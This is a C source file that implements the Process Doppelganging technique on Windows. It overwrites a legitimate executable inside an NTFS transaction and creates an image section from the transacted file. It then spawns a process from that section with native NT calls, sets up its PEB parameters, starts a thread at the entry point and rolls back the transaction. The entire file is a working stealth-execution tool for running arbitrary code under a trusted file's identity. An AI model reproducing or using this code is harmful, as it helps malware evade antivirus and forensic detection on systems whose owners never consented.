#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <KtmW32.h>
#include <lmerr.h>
#include <winternl.h>
#include <psapi.h>
#include <Processthreadsapi.h>
#include "ntdefs.h"

// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
#pragma comment(lib, "psapi.lib")


void
DisplayErrorText(
	DWORD dwLastError
)
{
	HMODULE hModule = NULL; // default to system source
	LPSTR MessageBuffer;
	DWORD dwBufferLength;

	DWORD dwFormatFlags = FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_IGNORE_INSERTS |
		FORMAT_MESSAGE_FROM_SYSTEM;

	//
	// If dwLastError is in the network range, 
	//  load the message source.
	//

	if (dwLastError >= NERR_BASE && dwLastError <= MAX_NERR) {
		hModule = LoadLibraryEx(
			TEXT("netmsg.dll"),
			NULL,
			LOAD_LIBRARY_AS_DATAFILE
		);

		if (hModule != NULL)
			dwFormatFlags |= FORMAT_MESSAGE_FROM_HMODULE;
	}

	//
	// Call FormatMessage() to allow for message 
	//  text to be acquired from the system 
	//  or from the supplied module handle.
	//

	if (dwBufferLength = FormatMessageA(
		dwFormatFlags,
		hModule, // module to get message from (NULL == system)
		dwLastError,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // default language
		(LPSTR)&MessageBuffer,
		0,
		NULL
	))
	{
		DWORD dwBytesWritten;

		//
		// Output message string on stderr.
		//
		WriteFile(
			GetStdHandle(STD_ERROR_HANDLE),
			MessageBuffer,
			dwBufferLength,
			&dwBytesWritten,
			NULL
		);

		//
		// Free the buffer allocated by the system.
		//
		LocalFree(MessageBuffer);
	}

	//
	// If we loaded a message source, unload it.
	//
	if (hModule != NULL)
		FreeLibrary(hModule);
}

LPVOID GetBaseAddressByName(HANDLE hProcess)
{
	MEMORY_BASIC_INFORMATION    mbi;
	SYSTEM_INFO si;
	LPVOID lpMem;
	/* Get maximum address range from system info */
	GetSystemInfo(&si);
	/* walk process addresses */
	lpMem = 0;
	while (lpMem < si.lpMaximumApplicationAddress) {
		VirtualQueryEx(hProcess, lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
		if (mbi.Type & MEM_IMAGE)
			return mbi.BaseAddress;
		/* increment lpMem to next region of memory */
		lpMem = (LPVOID)((ULONGLONG)mbi.BaseAddress +(ULONGLONG)mbi.RegionSize);
			
	}
	return NULL;
}

int main(int argc, char *argv[])
{

	LARGE_INTEGER liFileSize;
	DWORD dwFileSize;
	HANDLE hSection;
	NTSTATUS ret;

	UNICODE_STRING  string;
	if (argc < 3) {
		printf("%s <exe to Doppelgang> <your exe>", argv[0]);
		return 0;
	}
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	if (NULL == hNtdll)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got ntdll.dll at 0x%llx\n", hNtdll);
	NtCreateSection createSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");

	if (NULL == createSection)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);

	HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, L"doppelgang_test");
	if (INVALID_HANDLE_VALUE == hTransaction)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Created a transaction, handle 0x%x\n", hTransaction);

	HANDLE hTransactedFile = CreateFileTransacted(argv[1],
		GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
	if (INVALID_HANDLE_VALUE == hTransactedFile)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] CreateFileTransacted on %s, handle 0x%x\n", argv[1], hTransactedFile);

	HANDLE hExe = CreateFile(argv[2],
		GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hExe)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Opened %s, handle 0x%x\n", argv[2], hExe);

	BOOL err = GetFileSizeEx(hExe, &liFileSize);
	if (FALSE == err)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	dwFileSize = liFileSize.LowPart;
	printf("[+] %s size is 0x%x\n", argv[2], dwFileSize);

	BYTE *buffer = malloc(dwFileSize);
	if (NULL == buffer)
	{
		printf("Malloc failed\n");
		return -1;
	}
	printf("[+] Allocated 0x%x bytes\n", dwFileSize);

	// Fix for 32-bit, ReadFile/WriteFile requires a DWORD pointer to receive number of bytes read/written.
	DWORD dwBytes;
	if (FALSE == ReadFile(hExe, buffer, dwFileSize, &dwBytes, NULL))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Read %s to buffer\n", argv[2]);


	if (FALSE == WriteFile(hTransactedFile, buffer, dwFileSize, &dwBytes, NULL))

	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Overwrote %s in transcation\n", argv[1]);

	ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Created a section with our injected process\n");



	NtCreateProcessEx createProcessEx = (NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
	if (NULL == createProcessEx)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtCreateProcessEx 0x%08p\n", createProcessEx);

	HANDLE hProcess = 0;
	my_RtlInitUnicodeString initUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
	WCHAR temp[MAX_PATH] = { 0 };
	char temp2[MAX_PATH] = { 0 };

	GetFullPathName(argv[1], MAX_PATH, temp2, NULL);
	MultiByteToWideChar(CP_UTF8, 0, temp2, strlen(temp2), temp, MAX_PATH);
	initUnicodeString(&string, temp);

	ret = createProcessEx(&hProcess, GENERIC_ALL, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

	printf("[+] Created our process, handle 0x%x\n", hProcess);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}

	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buffer;

	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(buffer + dos_header->e_lfanew);

	ULONGLONG oep = ntHeader->OptionalHeader.AddressOfEntryPoint;

	oep += (ULONGLONG)GetBaseAddressByName(hProcess);


	printf("[+] Our new process oep is 0x%llx\n", oep);
	NtCreateThreadEx createThreadEx = (NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (NULL == createThreadEx)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtCreateThreadEx 0x%08p\n", createThreadEx);


	my_PRTL_USER_PROCESS_PARAMETERS ProcessParams = 0;
	RtlCreateProcessParametersEx createProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
	if (NULL == createProcessParametersEx)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got RtlCreateProcessParametersEx 0x%08p\n", createProcessParametersEx);




	ret = createProcessParametersEx(&ProcessParams, &string, NULL, NULL, &string, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Creating process parameters\n");

	LPVOID RemoteProcessParams;
	RemoteProcessParams = VirtualAllocEx(hProcess, ProcessParams, (DWORD)ProcessParams & 0xffff + ProcessParams->EnvironmentSize + ProcessParams->MaximumLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NULL == RemoteProcessParams)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Creating memory at process for our paramters 0x%08x\n", RemoteProcessParams);

	ret = WriteProcessMemory(hProcess, ProcessParams, ProcessParams, ProcessParams->EnvironmentSize + ProcessParams->MaximumLength, NULL);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Writing our paramters to the process\n");

	my_NtQueryInformationProcess queryInformationProcess = (my_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (NULL == queryInformationProcess)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtQueryInformationProcess 0x%08p\n", queryInformationProcess);

	PROCESS_BASIC_INFORMATION info;

	ret = queryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&info,
		sizeof(info),
		0);

	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}

	PEB *peb = info.PebBaseAddress;

	ret = WriteProcessMemory(hProcess, &peb->ProcessParameters, &ProcessParams, sizeof(LPVOID), NULL);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Writing our paramters to the process peb 0x%08x\n", peb);

	HANDLE hThread;
	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, FALSE, 0, 0, 0, NULL);
	printf("[+] Thread created with handle %x\n", hThread);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	if (FALSE == RollbackTransaction(hTransaction))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Rolling back the original %s\n", argv[1]);

	CloseHandle(hProcess);
	CloseHandle(hExe);
	CloseHandle(hTransactedFile);
	CloseHandle(hTransaction);
	return 0;
}
